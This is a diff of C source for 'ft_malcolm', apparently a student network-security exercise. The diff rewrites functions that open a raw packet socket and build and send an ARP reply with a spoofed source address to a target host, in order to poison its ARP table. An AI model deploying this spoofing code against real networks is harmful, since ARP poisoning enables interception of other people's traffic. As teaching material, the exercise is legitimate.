@@ -12,67 +12,82 @@
 
 #include "ft_malcolm.h"
 
-void	send_packet(void)
+void	connection(void)
 {
-	struct sockaddr_ll	addr;
-	uint8_t				frame[14 + sizeof(t_arp)];
+	g_data.info.sock_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
 
-
-	create_packet();
-	create_frame(frame);
-
-	ft_memset(&addr, 0, sizeof(struct sockaddr));
-	addr.sll_family = AF_PACKET;
-	addr.sll_protocol = htons(ETH_P_ARP);
-	addr.sll_ifindex = g_data.if_index;
-	addr.sll_halen = ETH_ALEN;
-	ft_memcpy(addr.sll_addr, g_data.arp.target_mac, ETH_ALEN);
-
-	if (sendto(g_data.sock_fd, frame, sizeof(frame), 0,
-			(struct sockaddr *)&addr, sizeof(struct sockaddr)) == -1)
-		fatal_error("Failed to send ARP packet!");
+	if (g_data.info.sock_fd < 0)
+		fatal_error("Failed to get socket descriptor!");
 }
 
-void	create_frame(uint8_t *frame)
-{
-	t_eth_hdr	*eth;
-	t_arp		*arp_payload;
-
-	eth = (t_eth_hdr *)frame;
-	arp_payload = (t_arp *)(frame + 14);
-	ft_memcpy(eth->dst_mac, g_data.arp.target_mac, ETH_ALEN);
-	ft_memcpy(eth->src_mac, g_data.arp.sender_mac, ETH_ALEN);
-	eth->ethertype = htons(ETH_P_ARP);
-
-	ft_memcpy(arp_payload, &g_data.arp, sizeof(t_arp));
-}
-
-void	create_packet(void)
-{
-	g_data.arp.htype = htons(1);
-	g_data.arp.ptype = htons(0x0800);
-	g_data.arp.hlen = ETH_ALEN;
-	g_data.arp.plen = INET4_LEN;
-	g_data.arp.opcode = htons(2);
-
-	ft_memcpy(g_data.arp.target_mac, g_data.arp.target_mac, ETH_ALEN);
-	ft_memcpy(g_data.arp.target_ip, g_data.arp.target_ip, INET4_LEN);
-}
-
-void	receive_packet (void)
+int	receive_packet (void)
 {
 	char				buffer[1024];
 	struct sockaddr_ll	client_addr;
 	socklen_t			addr_len;
 	ssize_t				bytes;
+	int					received;
 
 	addr_len = sizeof(client_addr);
-	bytes = recvfrom(g_data.sock_fd, buffer, sizeof(buffer), 0,
+	bytes = recvfrom(g_data.info.sock_fd, buffer, sizeof(buffer), 0,
 			(struct sockaddr *)&client_addr, &addr_len);
 
 	if (bytes == -1)
 		fatal_error("Failed to receive packet!");
 
-	// Excluir depois dos testes
-	
+	received = print_request(bytes, buffer);
+
+	return(received);
+}
+
+void	send_packet(void)
+{
+	u_int8_t			frame[ETH_LEN + sizeof(t_arp)];
+	struct sockaddr_ll	device;
+
+	setup_device(&device);
+	setup_packet();
+
+	ft_memcpy(frame, &g_data.eth, ETH_LEN);
+	ft_memcpy(frame + ETH_LEN, &g_data.arp, sizeof(t_arp));
+
+	printf("Now sending an ARP reply to the target address ");
+	printf("with spoofed source, please wait...");
+
+	if (sendto(g_data.info.sock_fd, &frame, sizeof(frame), 0,
+			(struct sockaddr *)&device, sizeof(device)) < 0)
+		fatal_error("Failed to send ARP packet!");
+
+	printf("Sent an ARP reply packet, you may now check the ");
+	printf("arp table on the target.");
+}
+
+void	setup_device(struct sockaddr_ll	*device)
+{
+	ft_memset(device, 0, sizeof(struct sockaddr_ll));
+	device->sll_family = AF_PACKET;
+	device->sll_protocol = htons(ETH_P_ARP);
+	device->sll_ifindex = get_index_if();
+	device->sll_halen = ETH_ALEN;
+	ft_memcpy(device->sll_addr, g_data.info.target_mac, ETH_ALEN * sizeof(uint8_t));
+}
+
+void	setup_packet(void)
+{
+	g_data.arp.htype = htons(ARPHRD_ETHER);
+	g_data.arp.ptype = htons(ETHERTYPE_IP);
+	g_data.arp.hlen = ETH_ALEN;
+	g_data.arp.plen = INET4_LEN;
+	g_data.arp.opcode = htons(ARPOP_REPLY);
+
+	ft_memcpy(g_data.arp.sender_mac, g_data.info.source_mac, ETH_ALEN);
+	ft_memcpy(g_data.arp.sender_ip, g_data.info.source_ip, INET4_LEN);
+	ft_memcpy(g_data.arp.target_mac, g_data.info.target_mac, ETH_ALEN);
+	ft_memcpy(g_data.arp.target_ip, g_data.info.target_ip, INET4_LEN);
+
+	g_data.eth.ethertype = htons(ETHERTYPE_ARP);
+	ft_memcpy(g_data.eth.dst_mac, g_data.info.target_mac, ETH_ALEN);
+	ft_memcpy(g_data.eth.src_mac, g_data.info.source_mac, ETH_ALEN);
+
+
 }
